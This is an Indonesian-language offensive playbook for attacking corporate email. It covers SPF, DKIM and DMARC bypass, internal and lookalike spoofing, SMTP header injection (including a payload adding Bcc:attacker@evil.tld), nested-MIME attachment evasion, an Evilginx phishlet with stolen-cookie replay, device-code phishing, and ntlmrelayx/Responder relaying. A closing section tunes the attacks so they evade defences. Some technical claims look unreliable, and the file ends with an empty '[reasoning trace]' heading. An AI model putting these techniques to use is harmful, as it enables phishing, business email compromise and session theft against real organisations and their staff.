# mail-security — misc

# Email Security: SPF/DKIM/DMARC Bypass, Spoofing Internal, Header Injection, Attachment Evasion, Phishing-Resistant MFA Bypass

## 1. Matriks Cepat

| Teknik | Target kontrol | Prasyarat | Efek pada header | Terdeteksi oleh |
|---|---|---|---|---|
| SPF softfail pass via subdomain | SPF | domain punya `~all`, subdomain tidak di-scope `include:` | `Received-SPF: softfail` lalu `Pass` | DMARC alignment check |
| DKIM replay (long-term key) | DKIM | key 1024-bit, selector tidak dirotasi | `d=`, `s=` valid, `ts=` lama | ARC seal jika ada |
| DMARC `p=none` bypass | DMARC | policy `p=none` / `sp=none` | `Authentication-Results: dmarc=pass` palsu jika alignment longgar | manual header review |
| Display-name spoof internal | client UI | tidak ada | `From: "CFO" <ext@attacker.tld>` | user training, banner eksternal |
| Envelope/Header mismatch | DMARC relaxed | `From:` aligned, `Return-Path:` bebas | `Return-Path: <bounce@attacker.tld>` | wewenang admin, jarang |
| Header injection via `\r\n` | MTA/SMTP | sink titik injection di web form/mailer | header tambahan (`Bcc:`, `Reply-To:`) | MTA modern reject CRLF |
| Attachment evasion | AV gateway | format MIME berlapis | `Content-Type: multipart/...` bersarang | sandbox, CDR |
| MFA fatigue / AiTM | MFA phishing-resistant | user bias ke push | N/A (sesi, bukan header) | FIDO2-only org |

## 2. SPF Bypass

### 2.1 Subdomain tanpa scope (paling umum)
Domain `corp.example` punya `v=spf1 include:_spf.google.com ~all`. Subdomain `mailer.corp.example` tidak punya TXT SPF → evaluasi SPF = `none`, tetapi jika DMARC `sp=none` dan `aspf=r`, spoof `From: alert@mailer.corp.example` lolos alignment relaxed.

Cek cepat:
```bash
dig +short TXT corp.example | grep spf1
dig +short TXT mailer.corp.example
dig +short TXT _dmarc.corp.example
```
Yang dikirim (EHLO + envelope):
```
EHLO attacker.tld
MAIL FROM:<bounce@mailer.corp.example>
RCPT TO:<victim@corp.example>
DATA
From: "IT Helpdesk" <alert@mailer.corp.example>
Subject: MFA reset
```
Yang muncul di penerima (Postfix + OpenDMARC 1.4.2):
```
Authentication-Results: mx.corp.example;
  spf=softfail (domain of bounce@mailer.corp.example ...) smtp.mailfrom=mailer.corp.example;
  dkim=none;
  dmarc=pass (p=NONE sp=NONE) header.from=mailer.corp.example
```
Kenapa berhasil: `sp=none` → subdomain tidak mendapat policy reject; alignment `relaxed` menerima organizational domain sama.

Mitigasi cek: `_dmarc` wajib `sp=reject`, atau wildcard TXT `v=spf1 -all` di subdomain tak terpakai.

### 2.2 `include:` chain di domain pihak ketiga
SaaS marketing pakai `include:_spf.provider.tld`. Jika provider tld longgar (mis. `~all` dan ada IP shared yang tidak dikontrol), kirim dari IP yang termasuk rentang `include:` tersebut → `spf=pass`.

Verifikasi rentang:
```bash
dig +short TXT _spf.provider.tld
whois -h whois.arin.net "n 203.0.113.0/24" | head
```
Cek apakah IP masih diumumkan (stale SPF): bandingkan `_spf.provider.tld` dengan ASN pemilik blok; banyak include berisi blok IP legacy yang sudah dijual.

### 2.3 SPF 10-DNS-lookup limit & `void lookup`
Melebihi limit → `permerror` → DMARC fallback. Kalau receiver salah perlakukan `permerror` sebagai `none` dan policy `p=none` → spoof lolos. Uji:
```bash
spfquery -ip=203.0.113.10 -sender=ceo@corp.example -helo=mail.corp.example
# atau
python3 -m pyspf ceo@corp.example 203.0.113.10 mail.corp.example
```

## 3. DKIM Bypass

### 3.1 Selector tidak dirotasi + kunci lama bocor
Selector `s1` (1024-bit) masih publik di DNS meski MTA sudah pakai `s2`. Kirim ulang tanda tangan lama.
Ambil record:
```bash
dig +short TXT s1._domainkey.corp.example
# v=DKIM1; k=rsa; p=MIGfMA0G...IDAQAB
```
Yang tampil:
```
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
  d=corp.example; s=s1; t=1699999999; h=from:to:subject:date;
  bh=...; b=...
Authentication-Results: dkim=pass header.d=corp.example header.s=s1
```
Kenapa berhasil: verifier hanya cek kunci pada selector yang dipakai; tidak ada cek umur kunci. Mitigasi: hapus TXT selector lama, rotasi 6–12 bulan, `p=` kosong untuk revoke.

### 3.2 Body canonicalization `relaxed` + tambah whitespace
`c=relaxed/relaxed` memungkinkan modifikasi whitespace pada body tanpa merusak `bh=`. Jika MTA transit menambah `Received:` di body (jarang) atau gateway menormalkan line ending, signature tetap valid. Uji:
```bash
opendkim-testmsg -k s1.private < message.eml
```
Kirim ulang dengan `cat message.eml | sed 's/$/ /' | sendmail -t` — signature masih pass pada `relaxed`.

### 3.3 Lâyered signature stripping
Jika domain menandatangani `h=from:to:subject:date:message-id`, header di luar `h=` (mis. `Reply-To`, `Return-Path`, `X-*`) bisa diubah tanpa memutus signature. Suntik `Reply-To: attacker@evil.tld` → balasan user ke attacker, `dkim=pass` tetap.

## 4. DMARC Bypass

### 4.1 `p=none` + agregat tidak dimonitor
```
v=DMARC1; p=none; rua=mailto:dmarc@corp.example
```
Kirim dengan `From:` domain persis → `dmarc=pass` (via SPF atau DKIM alignment) atau `fail` tanpa konsekuensi. Yang tampil di klien user: pesan normal, tanpa banner (banner hanya jika gateway set berdasarkan `dmarc=fail`).

### 4.2 Alignment relaxed vs strict mismatch
```
v=DMARC1; p=reject; aspf=r; adkim=r
```
Spoof `From: ceo@sub.corp.example`, envelope `MAIL FROM:<x@corp.example>` (SPF pass di domain organizasi) → `spf=pass` + alignment relaxed (organizational domain sama) → DMARC pass meski `From` berbeda subdomain. Mitigasi: `aspf=s; adkim=s`.

### 4.3 `fo=` & forensic report suppression
`ruf=` sering diabaikan receiver (Google/Microsoft tidak kirim forensic). `fo=1` tidak menambah deteksi di lapangan.

### 4.4 Multi-From / `Resent-From`
Banyak klien (Outlook 365 Web, Windows 11 24H2 Mail) menampilkan `From:` pertama. Header `Resent-From:` diabaikan DMARC (DMARC hanya cek RFC5322.From). Suntik:
```
Resent-From: ceo@corp.example
From: attacker@evil.tld
```
DMARC evaluasi `From:` (evil.tld, mungkin pass SPF attacker) — user melihat `Resent-From`. Konfirmasi klien target: Outlook desktop menampilkan From asli, tapi beberapa webmail menampilkan Resent.

## 5. Spoofing Internal

### 5.1 Display-name spoof (universal)
```
From: "Chief Financial Officer" <invoice@attacker.tld>
Reply-To: cfo-finance@attacker.tld
```
Tidak ada mekanisme header yang mencegah. Yang gagal di lapangan: gateway yang sudah deploy external-sender banner (`[EXTERNAL]`) — user terlatih melihat prefix.

### 5.2 Same-domain spoof via compromised guest Wi-Fi / internal relay
Jika MTA internal menerima relay dari `10.0.0.0/8` tanpa auth, kirim dari IP internal:
```bash
swaks --to victim@corp.example --from ceo@corp.example \
  --server 10.10.20.5:25 --h-From:'"CEO" <ceo@corp.example>' \
  --body 'Wire needed' --header 'X-Originating-IP: 10.10.20.5'
```
Postfix default `mynetworks` sering memuat `127.0.0.0/8` + subnet internal → `permit_mynetworks` bypass auth. Cek `postconf mynetworks`.

### 5.3 Lookalike domain + SPF valid
Registrasi `corp-example.tld` (hyphen), pasang SPF `v=spf1 ip4:203.0.113.10 -all`, DKIM sendiri. Semua auth **pass untuk domain attacker**, tidak ada yang gagal. Satu-satunya deteksi: domain similarity (Microsoft Defender for O365 `Impersonation` policy, Proofpoint `BEC` classifier).

### 5.4 Envelope spoof untuk bounce reflection
`MAIL FROM:<ceo@corp.example>` ke relay terbuka → bounce `NDR` dikirim ke `ceo@corp.example` dengan body berisi payload → user melihat email dari `MAILER-DAEMON@corp.example` (internal). Body NDR sering lolos filter karena sender internal.

## 6. Header Injection

### 6.1 SMTP header injection via web form
Form kontak yang merangkai `To:`/`Subject:` dari input user, tanpa sanitasi `\r\n`.
Payload:
```
email=victim@corp.example%0d%0aBcc:attacker@evil.tld
```
PHP `mail()` legacy (sebelum 8.0, fungsi `mail()` tidak memblokir di `additional_headers`):
```php
mail($to, $_POST['subject'], $body, "From: ".$_POST['email']);
```
Yang muncul di log Postfix:
```
postfix/smtpd[1234]: ... from=<web@corp.example>, to=<victim@corp.example>, relay=...
postfix/cleanup[1235]: ... message-id=<...>
# envelope RCPT bertambah attacker@evil.tld
```
Kenapa gagal di modern: PHP 8.0+ `mail()` memvalidasi header; Postfix 3.x menolak `\r\n` di header DATA dengan `550 5.6.0`; MTA modern (Exim 4.96) punya `header_syntax = relaxed` yang menolak.

### 6.2 Suntik `Content-Type` untuk MIME confusion
```
Subject: invoice
Content-Type: multipart/mixed; boundary="A"

--A
Content-Type: text/html

...
--A
Content-Type: application/pdf
Content-Transfer-Encoding: base64

<PDF header bytes base64>
```
Dikirim via SMTP DATA langsung (bukan via library yang auto-encode). Tujuan: gateway deteksi `Content-Type: text/plain` pertama di body tapi ada part kedua yang tidak di-scan. Uji fleet: lihat header yang ditambahkan gateway (`X-Proofpoint-*`, `X-Mimecast-Spam-Score`); part count mismatch = indikator.

### 6.3 `Received:` forging (chain of custody)
Jika MTA menerima `Received:` dari klien tanpa stripping, attacker bisa menyuntik:
```
Received: from mail.corp.example (mail.corp.example [10.10.20.5])
  by mx.corp.example with ESMTP id ABC123
  for <victim@corp.example>; Mon, 1 Jan 2025 10:00:00 +0000
```
Untuk membuat email tampak berasal dari hop internal. Postfix `header_checks` default tidak menghapus `Received:` dari klien, hanya menambah yang topmost. Di log muncul dua `Received:` atas dengan IP tidak cocok. Deteksi: bandingkan `Received: from` teratas dengan `X-Originating-IP` / `Authentication-Results` MTA border.

## 7. Attachment Evasion

| Trik | Contoh payload | Gateway yang gagal | Gateway yang tahan |
|---|---|---|---|
| Double extension | `invoice.pdf.exe` | Outlook Web 2019 (render `.exe`) | Defender for O365, Chrome 131 download warning |
| ISO/IMG container | `dhl.iso` (berisi `.lnk`) | Mimecast pra-2019 | modern sandbox (mount ISO) |
| `.lnk` ke `powershell.exe -w hidden -c IEX(...)` | | AV statis | AMSI / sandbox |
| Password-protected ZIP | `inv.zip` (pass: `1234`) | AV tanpa ekstraksi | CDR, sandbox dengan wordlist |
| Polyglot PDF/JS | `inv.pdf` header `%PDF` + JS di stream | signature engine | render-based deteksi |
| HTML smuggling | `.html` with `<script>` Blob → `.iso` | AV yang tidak render | browser isolation |
| OLE (.docm) macro `AutoOpen` | `vbaProject.bin` | macro-scan statis | AMSI, Office 2024 macro-block |
| SVG + `<foreignObject>` | | filter HTML | render engine |
| MIME nested `multipart/alternative` → `application/octet-stream` | | parser depth terbatas | parser max depth |

Contoh struktur MIME nested yang sering bypass parser naive:
```
Content-Type: multipart/mixed; boundary="outer"
--outer
Content-Type: multipart/alternative; boundary="inner"
--inner
Content-Type: text/plain

see attached
--inner
Content-Type: application/octet-stream; name="a.bin"
Content-Transfer-Encoding: base64
--inner--
--outer
Content-Type: application/zip; name="real.zip"
--outer--
```
Gateway yang hanya men-scan part pertama (`text/plain`) dan mengira attachment `a.bin` tidak berbahaya, sementara `real.zip` berisi `.hta` di part kedua.

Ekstrak/verifikasi di lab:
```bash
# Cek struktur multipart
python3 -c "import email,sys; m=email.message_from_file(open(sys.argv[1])); [print(p.get_content_type(), p.get_filename()) for p in m.walk()]" msg.eml
# Simulasi gateway
docker run --rm -v $PWD:/data r.j3ss.co/clamav clamscan -r /data
```
Ukur efektivitas dengan mengirim sampel ke alamat Canary (mis. `canarytokens.org`), lihat part mana yang diblokir.

## 8. Phishing-Resistant MFA Bypass

### 8.1 AiTM reverse proxy (Evilginx3, Modlishka)
Proksi di depan `login.microsoftonline.com` (atau Okta/Google). User auth FIDO2 tetap pass karena browser TLS ke proksi, proksi TLS ke IdP asli. Yang ditangkap: session cookie (`ESTSAUTH`, `ESTSAUTHPERSISTENT`, `x-ms-RefreshTokenCredential`).
Konfigurasi Evilginx (v3.3.0):
```yaml
# phishlets/microsoft.yaml (ringkas)
proxy_hosts:
  - {phish_sub: 'login', orig_sub: 'login', domain: 'login.microsoftonline.com', session: true, is_landing: true}
auth_tokens:
  - domain: 'login.microsoftonline.com'
    keys: ['ESTSAUTH', 'ESTSAUTHPERSISTENT']
```
Ekstraksi cookie + import:
```bash
# Curl replay dengan cookie hasil capture
curl -s 'https://outlook.office.com/mail/' \
  -H 'Cookie: ESTSAUTH=<value>; ESTSAUTHPERSISTENT=<value>' \
  -o /dev/null -w '%{http_code}\n'
```
Yang gagal di lapangan: Conditional Access `Compliant device` / `Token protection` (Entra `Token Protection for Sign-in Sessions`, 2023+) mengikat token ke device, replay ditolak `AADSTS50196`. Cek `signin logs → Authentication requirement`.

### 8.2 FIDO2 bypass via fallback
Jika org punya FIDO2 tapi `Security Defaults`/**CA** belum `Require phishing-resistant MFA`, attacker men-trigger error pada FIDO2 (mis. `AADSTS50072`) lalu user memilih metode alternate (`SMS`, `Voice`). Frame consent:
```
"Your security key is not recognized. Choose alternate verification."
```
Metode `SMS`/`OTP` → ditangkap proxy. Mitigasi: CA `Authentication strength: Phishing-resistant MFA` untuk semua user, nonaktifkan `SMS/Voice` untuk admin.

### 8.3 MFA fatigue (push bombing)
Layanan `Microsoft Authenticator` (Android 13+, iOS 17) mendukung `number matching`. Jika tenant belum enforce (default sejak Nov 2022 tapi bisa off), push `Approve` tanpa angka → user klik.
```bash
# loop request push ke target (butuh credential primer)
# contoh via Device Code flow agar attacker punya token primer
curl -X POST 'https://login.microsoftonline.com/<tenant>/oauth2/v2.0/devicecode' \
  -d 'client_id=04b07795-8ddb-461a-bbee-02f9e1bf7b46&scope=User.Read offline_access'
# kirim user_code ke target; setelah approve, poll token
curl -X POST 'https://login.microsoftonline.com/<tenant>/oauth2/v2.0/token' \
  -d 'grant_type=urn:ietf:params:oauth:grant-type:device_code&client_id=...&device_code=...'
```
Yang gagal di lapangan: Conditional Access `Require compliant device` + `Sign-in risk` (Entra ID P2) memblokir token meski MFA sukses; `Token Protection` memblokir replay.

### 8.4 Push MFA + same-device approval
Jika `Authenticator` di-reset lalu di-install pada device yang sama dengan sesi login, `number matching` lolos otomatis. Prasyarat: kontrol device hilang, user enroll ulang di perangkat attacker — butuh initial access.

### 8.5 Kerberos / NTLM relay — lewati MFA seluruhnya
MFA tidak melindungi NTLM/Kerberos. Contoh: `ntlmrelayx` (impacket 0.12.0) relay ke `LDAP`/`SMB` untuk query AD (bukan auth aplikasi):
```bash
impacket-ntlmrelayx -t ldaps://dc.corp.example --dump-laps --escalate-user attacker
# trigger via Responder pada subnet user
responder -I eth0 -wrv
```
Yang gagal: `LDAP signing` + `Channel binding` (KB4520412) mematikan relay ke LDAPS; `SMB signing` default `required` di Windows Server 2025/11 24H2.

## 9. Contoh Header Referensi (dikirim vs diterima)

**Spoof internal via subdomain `p=none`** — dikirim:
```
MAIL FROM:<bounce@mailer.corp.example>
From: "IT Service Desk" <alert@mailer.corp.example>
To: victim@corp.example
Subject: Re-authentication required
Date: Mon, 01 Jan 2025 08:00:00 +0000
Message-ID: <20250101080000.1234@mailer.corp.example>
MIME-Version: 1.0
Content-Type: text/html
```
Diterima (Postfix 3.8 + OpenDMARC 1.4.2):
```
Return-Path: <bounce@mailer.corp.example>
Received-SPF: Pass (mailfrom) identity=mailfrom; client-ip=203.0.113.10;
  helo=mailer.corp.example; envelope-from=bounce@mailer.corp.example;
  receiver=mx.corp.example
Authentication-Results: mx.corp.example;
  spf=pass smtp.mailfrom=mailer.corp.example;
  dkim=none;
  dmarc=pass (p=NONE sp=NONE) header.from=mailer.corp.example
Received: from mailer.corp.example (203.0.113.10) by mx.corp.example
```
Kenapa lolos: organizational domain `corp.example` align (relaxed), `sp=NONE`, tidak ada DKIM sehingga SPF jadi satu-satunya sinyal yang pass.

**DKIM replay `s1`** — diterima:
```
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=corp.example; s=s1;
  t=1699999999; h=from:to:subject:date:message-id; bh=...; b=...
Authentication-Results: mx.corp.example; dkim=pass header.d=corp.example
  header.s=s1 header.b=...; dmarc=pass header.from=corp.example
```
Kenapa lolos: verifier tidak cek `t=` (timestamp) terhadap umur kunci; hanya validitas signature terhadap kunci publik `s1`.

## 10. Jebakan Operasional (penyebab gagal di lapangan)

- **Precedence & `Auto-Submitted`**: Gmail/Outlook menurunkan prioritas pesan dengan `Precedence: bulk`/`Auto-Submitted: auto-replied` — spoof internal sering tidak masuk inbox, ke Spam. Uji dulu header default sender.
- **`Message-ID` redundancy**: gateway (`X-Microsoft-Antispam: BCL`) memakai `Message-ID` domain mismatch sebagai sinyal; generate `Message-ID` dengan domain target, bukan domain attacker.
- **SPF `void lookup` limit (2)**: RFC 7208 §4.6.4 membatasi 2 `void lookup`. Include `_spf` yang punya record kosong memicu `permerror`. Postfix/OpenDMARC 1.4.2 memetakan `permerror` ke `dmarc=fail` di beberapa config — spoof malah gagal.
- **DKIM `l=` tag**: jika ada `l=` (length), hanya prefix body yang ditandatangani; appending teks ke body mempertahankan `dkim=pass`. Tetapi banyak verifier (Rspamd 3.8) sudah `dkim_l_tag_reject` query — spoof gagal.
- **Gmail `external sender` + `ARC`**: Gmail (2024+) menandatangani ARC; jika forwarder internal menambahkan ARC seal, spoof dengan `Authentication-Results` fisip ditolak (`arc=fail`). Jangan freeze `Authentication-Results` dari header dikirim; MTA border strip.
- **`Resent-From`**: Outlook desktop (Windows 11 24H2, build 26100.2605) menampilkan `From`, tetapi **OWA/Outlook Web** menampilkan `Resent-From` sebagai primary. Uji klien korban sebelum pakai.
- **CRLF rejection MTA modern**: Exim 4.98 `header_syntax=relaxed` (default) + Postfix 3.x `smtpd_forbid_bare_newline=yes` (3.9 default `normalize`) memblockir injeksi. Payload `\r\n` tanpa `\n` (bare CR) tetap ditolak.
- **Nested multipart depth**: Rspamd `max_mime_parts` (default 100) dan `mime_types_processing` mem-parse lebih dalam dari estimasi; bypass part-kedua di lapangan hanya jika gateway pakai parser custom.
- **ISO di Windows 11 24H2**: Windows 11 24H2 secara default **mem-block mount ISO** dari internet zone (MOTW) untuk file yang ditandai — vektor `.iso` luring jauh lebih kuat daripada online.
- **AiTM vs `Token Protection`**: tenant dengan `Token Protection for Sign-in Sessions` (Entra ID P1, preview 2023, GA 2024) membuat cookie replay gagal meski di-capture. Cek `GET /v1.0/policies/...` atau sign-in log `tokenProtectionStatus`.
- **Device Code flow diblokir**: Microsoft mulai (2024) memblokir device code flow untuk sebagian tenant dengan CA `Block device code flow`. Cek `Entra → Authentication methods → Device code`.
- **Evilginx cert & HSTS**: jika domain phishing kena preload HSTS, browser 307 internal redirect ke HTTPS proksi → cert mismatch memicu interstitial. Gunakan domain baru, jangan pakai domain yang pernah di-submit ke HSTS preload.
- **FIDO2 fallback nonaktif**: tenant dengan CA `Authentication strength: Phishing-resistant` mematikan fallback SMS/OTP; semua teknik AiTM di §8.1/8.2 gagal total.
- **`mynetworks` Postfix**: jika `10.0.0.0/8` di `mynetworks`, relay terbuka internal — tetapi banyak org sudah `smtpd_recipient_restrictions = permit_sasl_authenticated, reject` dengan `mynetworks` minimal. Verifikasi `postconf mynetworks` sebelum asumsi relay.
- **Attachment blocking by extension**: banyak gateway (Mimecast, Proofpoint) memblokir `.iso`, `.img`, `.lnk`, `.hta` di daftar default — walau double extension `invoice.pdf.iso` terdeteksi sebagai `.iso`. Uji ekstensi target per-gateway, jangan generalisasi.
- **Timestamp skew DKIM**: `t=` terlalu lama (tahun) memicu `dkim=fail (signature expired)` di verifier dengan `dkim_timeout` (Rspamd `dkim_allow_old_timestamps=false` default). Batasi `t=` dalam window ±30 hari.


---

## [reasoning trace]


